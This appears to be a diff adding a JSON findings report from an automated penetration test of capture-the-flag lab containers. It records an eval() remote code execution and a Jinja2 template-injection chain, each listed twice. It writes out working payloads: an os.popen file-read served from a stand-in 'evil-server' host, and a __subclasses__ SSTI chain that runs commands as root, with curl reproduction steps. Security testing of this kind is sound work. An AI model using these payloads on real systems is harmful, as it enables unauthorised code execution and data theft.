@@ -1,0 +1,73 @@
+{
+  "meta": {
+    "created": "2026-04-15T11:20:47.394372+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "d6a8130e-b0f1-455a-9358-08c90955d6da",
+      "timestamp": "2026-04-15T11:20:47.394253+00:00",
+      "title": "Remote Code Execution via Unsafe eval() in Flask App (CTF Flag Captured)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:35475",
+      "description": "The flask_app container fetches a URL from nginx's /api/get endpoint, then fetches content from that URL and passes the JSON response's 'script' field directly to Python's eval() function without any sanitization. By setting the API URL to a malicious server returning {\"script\": \"__import__('os').popen('cat /FLAG.txt').read()\"}, arbitrary Python code execution is achieved on the flask_app container.",
+      "evidence": "flag{6a221da4-597c-4dea-98c2-4f2417dd77e7}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl http://172.17.0.1:35475/api/set?url=http://evil-server:9999/ && curl http://172.17.0.1:35475/app",
+        "expected": "Response contains eval() result: flag{6a221da4-597c-4dea-98c2-4f2417dd77e7}"
+      }
+    },
+    {
+      "id": "650eb000-c7d0-4950-a328-9a9f828809a0",
+      "timestamp": "2026-04-15T11:20:47.481716+00:00",
+      "title": "Remote Code Execution via Unsafe eval() in Flask App (CTF Flag Captured)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:35475",
+      "description": "The flask_app container fetches a URL from nginx's /api/get endpoint, then fetches content from that URL and passes the JSON response's 'script' field directly to Python's eval() function without any sanitization. By setting the API URL to a malicious server returning {\"script\": \"__import__('os').popen('cat /FLAG.txt').read()\"}, arbitrary Python code execution is achieved on the flask_app container.",
+      "evidence": "flag{6a221da4-597c-4dea-98c2-4f2417dd77e7}",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl http://172.17.0.1:35475/api/set?url=http://evil-server:9999/ && curl http://172.17.0.1:35475/app",
+        "expected": "Response contains eval() result: flag{6a221da4-597c-4dea-98c2-4f2417dd77e7}"
+      }
+    },
+    {
+      "id": "9764c690-75c3-40a5-90cf-449e47961c70",
+      "timestamp": "2026-04-15T11:44:00.374176+00:00",
+      "title": "Server-Side Template Injection (SSTI) in /remind endpoint leading to RCE",
+      "severity": "critical",
+      "target": "http://172.17.0.1:39845",
+      "description": "The /remind endpoint passes user-controlled input (date parameter) directly into render_template_string() using Python's str.format(), which allows Server-Side Template Injection. An authenticated attacker can inject Jinja2 templates to achieve arbitrary code execution.",
+      "evidence": "SSTI confirmed: {{7*7}} evaluates to 49. RCE achieved via: {% for c in ''.__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()') }}{% endif %}{% endfor %} returns uid=0(root) gid=0(root) groups=0(root). The vulnerable code in app.py: message = '''Reminder will be sent on {}'''.format(date); tmpl=render_template_string(message,date=date). The FLAG environment variable was empty in this container instance (FLAG=), and flag.txt was 0 bytes. The application writes os.getenv('FLAG', 'flag{this_is_a_fake_flag}') to flag.txt on startup.",
+      "tool_used": "custom SSTI exploitation",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -b 'session=<valid_session>' 'http://172.17.0.1:39845/remind?date={{7*7}}'",
+        "expected": "Response contains 'Reminder will be sent on 49'"
+      }
+    },
+    {
+      "id": "e353a382-90c5-40aa-84a9-9d69b5d18ad5",
+      "timestamp": "2026-04-15T11:44:00.423000+00:00",
+      "title": "Server-Side Template Injection (SSTI) in /remind endpoint leading to RCE",
+      "severity": "critical",
+      "target": "http://172.17.0.1:39845",
+      "description": "The /remind endpoint passes user-controlled input (date parameter) directly into render_template_string() using Python's str.format(), which allows Server-Side Template Injection. An authenticated attacker can inject Jinja2 templates to achieve arbitrary code execution.",
+      "evidence": "SSTI confirmed: {{7*7}} evaluates to 49. RCE achieved via: {% for c in ''.__class__.__base__.__subclasses__() %}{% if c.__name__ == 'catch_warnings' %}{{ c.__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"id\").read()') }}{% endif %}{% endfor %} returns uid=0(root) gid=0(root) groups=0(root). The vulnerable code in app.py: message = '''Reminder will be sent on {}'''.format(date); tmpl=render_template_string(message,date=date). The FLAG environment variable was empty in this container instance (FLAG=), and flag.txt was 0 bytes. The application writes os.getenv('FLAG', 'flag{this_is_a_fake_flag}') to flag.txt on startup.",
+      "tool_used": "custom SSTI exploitation",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -b 'session=<valid_session>' 'http://172.17.0.1:39845/remind?date={{7*7}}'",
+        "expected": "Response contains 'Reminder will be sent on 49'"
+      }
+    }
+  ],
+  "diagrams": []
+}
